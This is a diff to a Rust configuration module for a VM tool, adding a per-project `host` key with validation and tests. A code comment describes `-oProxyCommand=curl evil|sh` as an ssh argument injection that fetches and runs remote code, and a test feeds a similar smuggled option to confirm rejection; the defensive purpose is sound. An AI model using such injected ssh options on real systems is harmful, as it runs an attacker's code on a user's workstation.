@@ -7,9 +7,16 @@
 //! bombyx.
 //!
 //! It carries two things. A top-level `host` names the machine
-//! the VMs run on, and `super::host` ranks that value against
-//! `--host` and the environment. A `[projects.<name>]` table
-//! per project carries the settings that describe one VM:
+//! the VMs run on, and a `[projects.<name>]` table per project
+//! carries the settings that describe one VM.
+//!
+//! Both can name a host, and `super::host` ranks all four
+//! sources: `--host`, the `BOMBYX_HOST` environment variable,
+//! the named project's own `host` key, then the top-level one.
+//! An operator who keeps one project on a different machine
+//! writes `host` inside that project's table. The example below
+//! shows an entry without one, which is what most entries look
+//! like:
 //!
 //! ```toml
 //! host = "vmhost"
@@ -63,10 +70,11 @@ pub const USER_CONFIG_FILE: &str = "config.toml";
 /// Two fields are checked by their own types as the table
 /// parses: `repo` is a [`super::RepoUrl`] and `script` a
 /// [`super::ScriptPath`], so a bad value fails the parse and
-/// names the line. The rest -- `remote_root`, and `box`, `cpus`,
-/// `memory` and `ref` inside the two tables -- have rules that
-/// no type carries. `Project::validate` runs those, and
-/// [`Registry::project`] calls it before handing an entry out.
+/// names the line. The rest -- `remote_root`, the optional
+/// `host`, and `box`, `cpus`, `memory` and `ref` inside the two
+/// tables -- have rules that no type carries.
+/// `Project::validate` runs those, and [`Registry::project`]
+/// calls it before handing an entry out.
 #[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
 #[serde(deny_unknown_fields)]
 pub struct Project {
@@ -87,6 +95,31 @@ pub struct Project {
     /// rules.
     #[serde(default = "default_remote_root")]
     pub remote_root: String,
+
+    /// The VM host this one project runs on, when it does not
+    /// run on the machine the file-wide `host` names.
+    ///
+    /// Optional, and absent from most entries. It exists for
+    /// the operator who keeps one project on a different
+    /// machine: without it they type `--host` on every command
+    /// for that project and rely on remembering to.
+    ///
+    /// A `String` rather than a checked type, and the reason is
+    /// the third of the three cases `CLAUDE.md` allows: a
+    /// standard type already carries the meaning, because
+    /// `super::Config::host` is a `String` too and this value
+    /// becomes that one. A newtype on this field alone would be
+    /// unwrapped at that boundary, which is where the rule has
+    /// already run.
+    ///
+    /// So the rule runs instead of the type, and it runs on both
+    /// paths that reach the value: `super::Config::load` runs
+    /// `host_problem` once the ranking has picked a winner, so
+    /// the error names whichever source supplied the bad value,
+    /// and `Project::validate` runs the same function for
+    /// anything asking [`Registry::project`] for the entry
+    /// directly.
+    pub host: Option<String>,
 
     /// The machine to build.
     pub vm: Vm,
@@ -154,9 +187,10 @@ impl Project {
     /// Each rule lives in the module that owns the field, and
     /// this function states none of them: it calls
     /// `super::root::check` for `remote_root`, then the `[vm]`
-    /// and `[source]` checks. `super::Config::validate` calls
-    /// the same ones, and the two agree because neither holds a
-    /// copy of a rule.
+    /// and `[source]` checks, then `super::host::host_problem`
+    /// for an entry that names its own host.
+    /// `super::Config::validate` calls the same ones, and the
+    /// two agree because neither holds a copy of a rule.
     ///
     /// # Errors
     ///
@@ -167,6 +201,26 @@ impl Project {
         super::root::check(&self.remote_root)?;
         super::vm::validate(&self.vm)?;
         super::source::validate(&self.source)?;
+        // `host` reaches `ssh` as its first positional argument
+        // and `ssh` honours no `--` separator, so
+        // `-oProxyCommand=curl evil|sh` runs code on the
+        // workstation. `super::host::host_problem` holds the
+        // rule and this calls it, so the entry lookup and the
+        // ranking cannot come to disagree about what a legal
+        // host looks like.
+        if let Some(host) = &self.host
+            && let Some(problem) = super::host_problem(host)
+        {
+            return Err(match problem {
+                super::HostProblem::Empty => {
+                    ConfigError::Empty { field: "host" }
+                }
+                super::HostProblem::Invalid(reason) => ConfigError::Invalid {
+                    field: "host",
+                    reason,
+                },
+            });
+        }
         Ok(())
     }
 }
@@ -203,14 +257,56 @@ impl Registry {
     ///
     /// **Unchecked, unlike [`Registry::project`].** The rules
     /// for a host value live in `super::host`, and
-    /// `super::Config::load` runs them once the ranking between
-    /// `--host`, the environment and this file has picked a
-    /// winner -- so the error can name the source that supplied
+    /// `super::Config::load` runs them once the ranking across
+    /// all four sources -- `--host`, the environment, and the
+    /// two keys in this file -- has picked a winner, so the
+    /// error can name the source that supplied
     /// the bad value. Checking here as well would report a value
     /// this file supplies even on a run that never uses it.
     #[must_use]
     pub fn host(&self) -> Option<&str> {
         self.host.as_deref()
+    }
+
+    /// Returns the VM host specified by the entry for `name`,
+    /// together with the map key that carried it.
+    ///
+    /// The key comes back because a caller reporting where the
+    /// host came from wants the table heading as this file
+    /// spells it, and re-parsing `name` into a [`ProjectName`]
+    /// would be checking a value the lookup has already proved
+    /// legal.
+    ///
+    /// **Absence is `None`, never an error.** A name with no
+    /// table, and a name no table key could hold, both answer
+    /// `None`, because asking which host a project prefers is
+    /// not asking for its entry. [`Registry::project`] is what
+    /// reports a missing entry, once, with a message saying
+    /// which table to write.
+    ///
+    /// **No rule runs on the value returned**, neither the host
+    /// rule nor the rest of `Project::validate`. Two separate
+    /// reasons, and both are about reporting the problem in the
+    /// right place. `super::Config::load` runs
+    /// `super::host_problem` once the ranking has picked a
+    /// winner, so the error names the source that supplied the
+    /// bad value rather than one this run never consulted. And
+    /// an entry whose `cpus` is zero still supplies its host
+    /// here, because refusing would demote that project to the
+    /// file-wide host and boot its VM on the wrong machine,
+    /// while the broken value is reported anyway the moment
+    /// anything asks [`Registry::project`] for the entry.
+    ///
+    /// That is also why this is `pub(crate)`: the guarantee that
+    /// a leading `-` never reaches `ssh` rests on `Config::load`
+    /// running the rule, and handing the unchecked value outside
+    /// the crate would put that guarantee in a caller's hands.
+    pub(crate) fn project_host(
+        &self,
+        name: &str,
+    ) -> Option<(&ProjectName, &str)> {
+        let (key, project) = self.projects.get_key_value(name)?;
+        Some((key, project.host.as_deref()?))
     }
 
     /// Returns the entry for `name`.
@@ -335,6 +431,11 @@ mod tests {
         parse_at(source, "/home/dev/config.toml").unwrap()
     }
 
+    /// The host `name`'s entry names, without the key beside it.
+    fn host_of<'a>(registry: &'a Registry, name: &str) -> Option<&'a str> {
+        registry.project_host(name).map(|(_key, host)| host)
+    }
+
     /// Writes `source` as the registry inside a fresh directory.
     fn registry_dir(source: &str) -> tempfile::TempDir {
         let dir = tempfile::tempdir().unwrap();
@@ -390,6 +491,14 @@ mod tests {
                 "box = \"generic/ubuntu\\\"2204\"",
             ),
             ("ref = \"main\"", "ref = \"\""),
+            (
+                "remote_root = \"~/vms\"",
+                "remote_root = \"~/vms\"\nhost = \"-oProxyCommand=x\"",
+            ),
+            (
+                "remote_root = \"~/vms\"",
+                "remote_root = \"~/vms\"\nhost = \"\"",
+            ),
         ] {
             let source = registry_toml().replace(from, to);
             let registry = parsed(&source);
@@ -398,6 +507,57 @@ mod tests {
                 "{to} was accepted"
             );
         }
+    }
+
+    #[test]
+    fn a_project_entry_may_name_its_own_host() {
+        // An operator who keeps one project on another
+        // machine has no other way to record that choice:
+        // `--host` covers a single run and nothing else
+        // remembers it.
+        let source = registry_toml().replace(
+            "[projects.myproject]\n",
+            "[projects.myproject]\nhost = \"otherbox\"\n",
+        );
+        let registry = parsed(&source);
+        assert_eq!(host_of(&registry, "myproject"), Some("otherbox"));
+    }
+
+    #[test]
+    fn an_entry_with_no_host_of_its_own_supplies_none() {
+        // The key is optional, so most entries leave the
+        // file-wide `host` to apply.
+        let registry = parsed(&registry_toml());
+        assert_eq!(host_of(&registry, "myproject"), None);
+    }
+
+    #[test]
+    fn a_name_with_no_entry_supplies_no_host() {
+        // Including a name no table key could hold. Asking for
+        // a host is not asking for the entry, so this reports
+        // absence rather than the error `project` raises.
+        let registry = parsed(&registry_toml());
+        for name in ["other", "", "../../etc", "-x"] {
+            assert_eq!(host_of(&registry, name), None, "{name:?}");
+        }
+    }
+
+    #[test]
+    fn a_host_survives_a_broken_value_elsewhere_in_its_entry() {
+        // `project_host` runs no checks, exactly as `host`
+        // runs none. Were it to validate, an entry with a bad
+        // `cpus` would quietly demote its host to the
+        // file-wide one and boot the VM on the wrong machine.
+        // The entry's own error still arrives, from `project`.
+        let source = registry_toml()
+            .replace(
+                "[projects.myproject]\n",
+                "[projects.myproject]\nhost = \"otherbox\"\n",
+            )
+            .replace("cpus = 4", "cpus = 0");
+        let registry = parsed(&source);
+        assert_eq!(host_of(&registry, "myproject"), Some("otherbox"));
+        assert!(registry.project("myproject").is_err());
     }
 
     #[test]
